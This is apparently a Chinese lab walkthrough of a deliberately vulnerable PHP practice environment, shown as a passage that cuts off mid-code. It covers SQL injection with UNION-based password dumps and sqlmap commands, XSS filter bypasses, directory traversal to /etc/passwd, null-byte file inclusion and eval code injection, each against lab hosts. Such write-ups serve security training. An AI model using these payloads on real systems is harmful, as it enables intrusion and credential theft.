<h4 id="参数说明：-11"><a href="#参数说明：-11" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要发送的报头字符串。</td>
</tr>
<tr>
<td>replace</td>
<td style="text-align:center">可选。指示该报头是否替换之前的报头，或添加第二个报头。默认是 true（替换）。false（允许相同类型的多个报头）。</td>
</tr>
<tr>
<td>http_response_code</td>
<td style="text-align:center">可选。把 HTTP 响应代码强制为指定的值。（PHP 4 以及更高版本可用）</td>
</tr>
</tbody>
</table>
<h2 id="SQL-injections"><a href="#SQL-injections" class="headerlink" title="SQL injections"></a>SQL injections</h2><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql = &quot;SELECT * FROM users where name=&apos;&quot;; $sql .= $_GET[&quot;name&quot;].&quot;&apos;&quot;; $result = mysql_query($sql); if ($result) &#123; ?&gt;</div></pre></td></tr></table></figure>
<p>字符类型的注入，无过滤<br>用来练习手注是个不错的题目</p>
<h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; 页面返回异常</div><div class="line"></div><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; and 1=1%23 页面返回正常</div><div class="line"></div><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; and 1=2%23 页面返回正常</div></pre></td></tr></table></figure>
<h4 id="判断字段长"><a href="#判断字段长" class="headerlink" title="判断字段长"></a>判断字段长</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; order by 5%23 页面返回正常</div><div class="line"></div><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; order by 6%23 页面返回异常</div></pre></td></tr></table></figure>
<p>推断出这个表中有5个字段</p>
<h4 id="猜解当前数据库名；"><a href="#猜解当前数据库名；" class="headerlink" title="猜解当前数据库名；"></a>猜解当前数据库名；</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,database(),3,4,5%23</div></pre></td></tr></table></figure>
<h4 id="猜解所有的数据库"><a href="#猜解所有的数据库" class="headerlink" title="猜解所有的数据库"></a>猜解所有的数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,SCHEMA_NAME,3,4,5 from information_schema.SCHEMATA%23</div></pre></td></tr></table></figure>
<h4 id="猜解所有的表名"><a href="#猜解所有的表名" class="headerlink" title="猜解所有的表名"></a>猜解所有的表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,table_name,3,4,5 from information_schema.tables%23</div></pre></td></tr></table></figure>
<h4 id="猜解当前数据库（exercises）的所以表名"><a href="#猜解当前数据库（exercises）的所以表名" class="headerlink" title="猜解当前数据库（exercises）的所以表名"></a>猜解当前数据库（exercises）的所以表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,table_name,3,4,5 from information_schema.tables where table_schema= database()%23</div></pre></td></tr></table></figure>
<h4 id="猜解当前数据库的user的字段名"><a href="#猜解当前数据库的user的字段名" class="headerlink" title="猜解当前数据库的user的字段名"></a>猜解当前数据库的user的字段名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,COLUMN_NAME,2,4,5 from information_schema.COLUMNS where table_name = &apos;users&apos;%23</div></pre></td></tr></table></figure>
<h4 id="判断版本号"><a href="#判断版本号" class="headerlink" title="判断版本号"></a>判断版本号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,version(),2,4,5%23</div></pre></td></tr></table></figure>
<h4 id="判断用户名"><a href="#判断用户名" class="headerlink" title="判断用户名"></a>判断用户名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,user(),2,4,5%23  </div><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,current_user(),2,4,5%23</div><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,system_user(),2,4,5%23</div><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,session_user(),2,4,5%23</div></pre></td></tr></table></figure>
<h4 id="读取值"><a href="#读取值" class="headerlink" title="读取值"></a>读取值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example1.php?name=root&apos; union select 1,name,passwd,4,5 from users%23</div></pre></td></tr></table></figure>
<h4 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://192.168.1.105/sqli/example1.php?name=root --dbs</div></pre></td></tr></table></figure>
<h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (preg_match(&apos;/ /&apos;, $_GET[&quot;name&quot;])) &#123; die(&quot;ERROR NO SPACE&quot;); &#125; $sql = &quot;SELECT * FROM users where name=&apos;&quot;; $sql .= $_GET[&quot;name&quot;].&quot;&apos;&quot;; $result = mysql_query($sql);</div></pre></td></tr></table></figure>
<p>与example1差不多，过滤了空格，语句中存现空格就会报错</p>
<p>mysql注入绕过空格过滤的方法：</p>
<p>1、水平制表(HT) url编码：%09</p>
<p>2、注释绕过空格   /<em>注释</em>/</p>
<h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example2.php?name=root&apos;%09union%09select%091,name,passwd,4,5%09from%09users%23  %09替换空格绕过</div><div class="line"></div><div class="line">http://192.168.1.105/sqli/example2.php?name=root&apos;/**/union/**/select/**/1,name,passwd,4,5/**/from/**/users%23  /**/替换空格绕过</div></pre></td></tr></table></figure>
<h4 id="SQLMAP-1"><a href="#SQLMAP-1" class="headerlink" title="SQLMAP"></a>SQLMAP</h4><p>调用space2comment.py<br>用“/**/”替换空格符绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://192.168.1.105/sqli/example3.php?name=root --dbs --tamper=space2comment.py</div></pre></td></tr></table></figure></p>
<h3 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3"></a>Example 3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (preg_match(&apos;/\s+/&apos;, $_GET[&quot;name&quot;])) &#123; die(&quot;ERROR NO SPACE&quot;); &#125; $sql = &quot;SELECT * FROM users where name=&apos;&quot;; $sql .= $_GET[&quot;name&quot;].&quot;&apos;&quot;;</div></pre></td></tr></table></figure>
<p>在example2的基础上，\s匹配任何空白字符,包括空格、制表符、换页符等，全部过滤掉<br>可以使用example2中 /<em>注释</em>/ 绕过过滤</p>
<h4 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example2.php?name=root&apos;/**/union/**/select/**/1,name,passwd,4,5/**/from/**/users%23</div></pre></td></tr></table></figure>
<h4 id="SQLMAP-2"><a href="#SQLMAP-2" class="headerlink" title="SQLMAP"></a>SQLMAP</h4><p>调用space2comment.py<br>用“/**/”替换空格符绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://192.168.1.105/sqli/example3.php?name=root --dbs --tamper=space2comment.py</div></pre></td></tr></table></figure>
<h3 id="Example-4"><a href="#Example-4" class="headerlink" title="Example 4"></a>Example 4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql=&quot;SELECT * FROM users where id=&quot;; $sql.=mysql_real_escape_string($_GET[&quot;id&quot;]).&quot; &quot;; $result = mysql_query($sql);</div></pre></td></tr></table></figure>
<p>数值型的注入，过滤了单引号等，对数值型无效</p>
<h4 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example4.php?id=2 or 1=1</div><div class="line">http://192.168.1.105/sqli/example4.php?id=2 union select 1,name, passwd,4,5 from users</div></pre></td></tr></table></figure>
<h4 id="SQLMAP-3"><a href="#SQLMAP-3" class="headerlink" title="SQLMAP"></a>SQLMAP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://192.168.1.105/sqli/example4.php?id=2 --dbs</div></pre></td></tr></table></figure>
<h3 id="Example-5"><a href="#Example-5" class="headerlink" title="Example 5"></a>Example 5</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (!preg_match(&apos;/^[0-9]+/&apos;, $_GET[&quot;id&quot;])) &#123; die(&quot;ERROR INTEGER REQUIRED&quot;); &#125;</div></pre></td></tr></table></figure>
<p>与前面类似，以一个数字开头的，后面可添加构造的sql语句进行攻击测试</p>
<h4 id="Payload-3"><a href="#Payload-3" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example4.php?id=2 or 1=1</div><div class="line">http://192.168.1.105/sqli/example4.php?id=2 union select 1,name, passwd,4,5 from users</div></pre></td></tr></table></figure>
<h4 id="SQLMAP-4"><a href="#SQLMAP-4" class="headerlink" title="SQLMAP"></a>SQLMAP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://192.168.1.105/sqli/example5.php?id=2 --dbs</div></pre></td></tr></table></figure>
<h3 id="Example-6"><a href="#Example-6" class="headerlink" title="Example 6"></a>Example 6</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (!preg_match(&apos;/[0-9]+$/&apos;, $_GET[&quot;id&quot;])) &#123; die(&quot;ERROR INTEGER REQUIRED&quot;); &#125;</div></pre></td></tr></table></figure>
<p>正则表达式值确保了参数id是以一个数字结尾的.他不能确保id参数的开头是合法的.</p>
<p>你可以变通一下前面说到的检测方法.你只需要在你的payload后面加上数字.比如你可以这样:1 or 1=1 # 123</p>
<h4 id="Payload-4"><a href="#Payload-4" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example6.php?id=2 or 1=1-- - 1</div><div class="line">http://192.168.1.105/sqli/example6.php?id=2 or 1=1# 1</div><div class="line">http://192.168.1.105/sqli/example6.php?id=2 union select 1,name,passwd,4,5 from users-- - 123</div></pre></td></tr></table></figure>
<h4 id="SQLMAP-5"><a href="#SQLMAP-5" class="headerlink" title="SQLMAP"></a>SQLMAP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://192.168.1.105/sqli/example6.php?id=2 --dbs</div></pre></td></tr></table></figure>
<h3 id="Example-7"><a href="#Example-7" class="headerlink" title="Example 7"></a>Example 7</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (!preg_match(&apos;/^-?[0-9]+$/m&apos;, $_GET[&quot;id&quot;])) &#123; die(&quot;ERROR INTEGER REQUIRED&quot;); &#125;</div></pre></td></tr></table></figure>
<p>正则表达式将检查开始和结束的字符串是一个数字。然而，正则表达式中有一个修饰符/m。它只检查一行，不关心下一行有开始还是结束用数字。所以我们可以绕过它采用id =2\npayload。我们需要把\n转换成十六进制。就是%a0</p>
<h4 id="Payload-5"><a href="#Payload-5" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.110/sqli/example7.php?id=2%0aunion%0aselect%0a1,name,passwd,4,5%0afrom%0ausers%23</div></pre></td></tr></table></figure>
<h4 id="SQLMAP-6"><a href="#SQLMAP-6" class="headerlink" title="SQLMAP"></a>SQLMAP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://192.168.1.110/sqli/example7.php?id=2%0a</div></pre></td></tr></table></figure>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="Example-1-1"><a href="#Example-1-1" class="headerlink" title="Example 1"></a>Example 1</h3><p>没有做任何过滤</p>
<h4 id="Payload-6"><a href="#Payload-6" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(1)&lt;/script&gt;</div></pre></td></tr></table></figure>
<h3 id="Example-2-1"><a href="#Example-2-1" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">preg_replace(&quot;/&lt;script&gt;/&quot;,&quot;&quot;,$name);</div><div class="line">preg_replace(&quot;/&lt;\/script&gt;/&quot;,&quot;&quot;,$name);</div></pre></td></tr></table></figure>
<p>过滤script标签，利用大写绕过</p>
<h4 id="Payload-7"><a href="#Payload-7" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
<h3 id="Example-3-1"><a href="#Example-3-1" class="headerlink" title="Example 3"></a>Example 3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">preg_replace(&quot;/&lt;script&gt;/i&quot;,&quot;&quot;,$name);</div><div class="line">preg_replace(&quot;/&lt;\/script&gt;/i&quot;,&quot;&quot;,$name);</div></pre></td></tr></table></figure>
<p>过滤script标签，且使用模式修正符i，忽略大小写。</p>
<h4 id="Payload-8"><a href="#Payload-8" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/sc&lt;/script&gt;ript&gt;</div></pre></td></tr></table></figure>
<h3 id="Example-4-1"><a href="#Example-4-1" class="headerlink" title="Example 4"></a>Example 4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/script/i&apos;,$_GET[&quot;name&quot;])</div></pre></td></tr></table></figure>
<p>过滤script字符，且使用模式修正符i,忽略大小写。<br>利用img标签</p>
<h4 id="Payload-9"><a href="#Payload-9" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=1 onerror=alert(1)&gt;</div></pre></td></tr></table></figure>
<h3 id="Example-5-1"><a href="#Example-5-1" class="headerlink" title="Example 5"></a>Example 5</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/alert/i&apos;,$_GET[&quot;name&quot;]))</div></pre></td></tr></table></figure>
<p>过滤alert字符，且使用模式修正符i,忽略大小写<br>利用prompt(),confirm(),String.fromCharCode()函数实现弹框</p>
<h4 id="Payload-10"><a href="#Payload-10" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;prompt(1);&lt;/script&gt;</div><div class="line">&lt;script&gt;confirm(1);&lt;/script&gt;</div><div class="line">&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))&lt;/script&gt;</div></pre></td></tr></table></figure>
<h3 id="Example-6-1"><a href="#Example-6-1" class="headerlink" title="Example 6"></a>Example 6</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">	var $a=&quot;&lt;?php echo $_GET[&quot;name&quot;];?&gt;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>有源码可以看出，GET方式得到的参数直接发送到javascript代码中，所以在发送Payload的时候不需要添加script标签，只需要发送需要只执行的javascript代码即可。</p>
<h4 id="Payload-11"><a href="#Payload-11" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;;alert(1);//</div></pre></td></tr></table></figure>
<p>构成以下代码,实现弹窗<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">	var $a= &quot;hacker&quot;;alert(1);//&quot;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<h3 id="Example-7-1"><a href="#Example-7-1" class="headerlink" title="Example 7"></a>Example 7</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">	var $a=&apos;&lt;?php echo htmlentities($_GET[&quot;name&quot;]);?&gt;&apos;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>使用htmlentities进行HTML编码，默认编码双引号</p>
<h4 id="Payload-12"><a href="#Payload-12" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;;alert(1);//</div></pre></td></tr></table></figure>
<h3 id="Example-8"><a href="#Example-8" class="headerlink" title="Example 8"></a>Example 8</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if （isset($_POST[&quot;name&quot;]）)&#123;</div><div class="line">	echo &quot;HELLO &quot;.htmlentities($_POST[&quot;name&quot;])</div><div class="line">	&#125;</div><div class="line">?&gt;</div><div class="line">&lt;form action=&quot;&lt;?php echo $_SERVER[&apos;PHP_SELF&apos;]; ?&gt;&quot; method=&quot;POST&quot;&gt;</div></pre></td></tr></table></figure>
<p>利用$_SERVER[‘PHP_SELF’]获取当前页面地址</p>
<p>假设该页面地址为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.110/xss/example8.php</div></pre></td></tr></table></figure></p>
<p>访问该页面，得到的表单 html 代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;form method=&quot;post&quot; action=&quot;/xss/example8.php&quot;&gt;</div></pre></td></tr></table></figure></p>
<h4 id="Payload-13"><a href="#Payload-13" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div></pre></td></tr></table></figure>
<h3 id="Example-9"><a href="#Example-9" class="headerlink" title="Example 9"></a>Example 9</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">	document.write(location.hash.substring(1));</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<h4 id="Payload-14"><a href="#Payload-14" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#&lt;script&gt;alert(1)&lt;/script&gt;</div></pre></td></tr></table></figure>
<h2 id="Directory-traversal"><a href="#Directory-traversal" class="headerlink" title="Directory traversal"></a>Directory traversal</h2><h3 id="Example-1-2"><a href="#Example-1-2" class="headerlink" title="Example 1"></a>Example 1</h3><p>简单目录遍历</p>
<h4 id="Payload-15"><a href="#Payload-15" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.10/dirtrav/example1.php?file=../../../../../../../etc/passwd</div></pre></td></tr></table></figure>
<h3 id="Example-2-2"><a href="#Example-2-2" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if(!(strstr($file,&quot;/var/www/files/&quot;)))</div><div class="line">	die();</div></pre></td></tr></table></figure>
<p>检测是否包含/var/www/files/字符串</p>
<h4 id="Payload-16"><a href="#Payload-16" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.110/dirtrav/example2.php?file=/var/www/files/../../../../../../../etc/passwd</div></pre></td></tr></table></figure>
<h3 id="Example-3-2"><a href="#Example-3-2" class="headerlink" title="Example 3"></a>Example 3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$path = preg_replace(&apos;/\x00.*/&apos;,&quot;&quot;,$path);</div></pre></td></tr></table></figure>
<p>使用%00截断后面字符串，读取passwd文件</p>
<h4 id="Payload-17"><a href="#Payload-17" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/dirtrav/example3.php?file=../../../../../../../etc/passwd%00</div></pre></td></tr></table></figure>
<h2 id="File-Include"><a href="#File-Include" class="headerlink" title="File Include"></a>File Include</h2><h3 id="Example-1-3"><a href="#Example-1-3" class="headerlink" title="Example 1"></a>Example 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">include($_GET[&quot;page&quot;]);</div></pre></td></tr></table></figure>
<h4 id="Payload-18"><a href="#Payload-18" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.110/fileincl/example2.php?page=intro.php</div></pre></td></tr></table></figure>
<p>读取intro.php文件</p>
<h3 id="Example-2-3"><a href="#Example-2-3" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$file = preg_replace(&apos;/\x00.*/&apos;,&quot;&quot;,$file);</div><div class="line">	include($file);</div></pre></td></tr></table></figure>
<p>使用%00截断后面字符串</p>
<h4 id="Payload-19"><a href="#Payload-19" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.110/fileincl/example2.php?page=intro.php%00</div></pre></td></tr></table></figure>
<h2 id="Code-injection"><a href="#Code-injection" class="headerlink" title="Code injection"></a>Code injection</h2><h3 id="Example-1-4"><a href="#Example-1-4" class="headerlink" title="Example 1"></a>Example 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php   </div><div class="line">  $str=&quot;echo \&quot;Hello &quot;.$_GET[&apos;name&apos;].&quot;!!!\&quot;;&quot;;  </div><div class="line">  </div><div class="line">  eval($str);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>使用了反斜杠【\】将echo后面的内容给转义了。这样做与加addslashes()函数进行过滤的意思是一样的<br>可以通过${${ }}这样的方式绕过，从而继续执行代码。</p>
<h4 id="Payload-20"><a href="#Payload-20" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.101/codeexec/example1.php?name=$&#123;$&#123;phpinfo()&#125;&#125;</div></pre></td></tr></table></figure>
<h3 id="Example-2-4"><a href="#Example-2-4" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">class User&#123;  </div><div class="line">  public $id, $name, $age;  </div><div class="line">  function __construct($id, $name, $age)&#123;  </div><div class="line">    $this-&gt;name= $name;  </div><div class="line">    $this-&gt;age = $age;  </div><div class="line">    $this-&gt;id = $id;  </div><div class="line">  &#125;     </div><div class="line">&#125;  </div><div class="line">  require_once(&apos;../header.php&apos;);  </div><div class="line">  require_once(&apos;../sqli/db.php&apos;);  </div><div class="line">    $sql = &quot;SELECT * FROM users &quot;;  </div><div class="line">  </div><div class="line">    $order = $_GET[&quot;order&quot;];  </div><div class="line">    $result = mysql_query($sql);  </div><div class="line">  if ($result) &#123;  </div><div class="line">        while ($row = mysql_fetch_assoc($result)) &#123;  </div><div class="line">      $users[] = new User($row[&apos;id&apos;],$row[&apos;name&apos;],$row[&apos;age&apos;]);  </div><div class="line">    &#125;  </div><div class="line">    if (isset($order))&lt;span style=&quot;color:#FF0000;&quot;&gt; &#123;   </div><div class="line">      usort($users, create_function(&apos;$a, $b&apos;, &apos;return strcmp($a-&gt;&apos;.$order.&apos;,$b-&gt;&apos;.$order.&apos;);&apos;));  </div><div class="line">    &#125;&lt;/span&gt;  </div><div class="line">    &#125;     </div><div class="line">  </div><div class="line">        ?&gt;  </div><div class="line">        &lt;table class=&apos;table table-striped&apos; &gt;  </div><div class="line">        &lt;tr&gt;  </div><div class="line">            &lt;th&gt;&lt;a href=&quot;example2.php?order=id&quot;&gt;id&lt;/th&gt;  </div><div class="line">            &lt;th&gt;&lt;a href=&quot;example2.php?order=name&quot;&gt;name&lt;/th&gt;  </div><div class="line">            &lt;th&gt;&lt;a href=&quot;example2.php?order=age&quot;&gt;age&lt;/th&gt;  </div><div class="line">        &lt;/tr&gt;  </div><div class="line">        &lt;?php  </div><div class="line">  </div><div class="line">    foreach ($users as $user) &#123;    </div><div class="line">            echo &quot;&lt;tr&gt;&quot;;  </div><div class="line">                echo &quot;&lt;td&gt;&quot;.$user-&gt;id.&quot;&lt;/td&gt;&quot;;  </div><div class="line">                echo &quot;&lt;td&gt;&quot;.$user-&gt;name.&quot;&lt;/td&gt;&quot;;  </div><div class="line">                echo &quot;&lt;td&gt;&quot;.$user-&gt;age.&quot;&lt;/td&gt;&quot;;  </div><div class="line">            echo &quot;&lt;/tr&gt;&quot;;  </div><div class="line">        &#125;     </div><div class="line">        echo 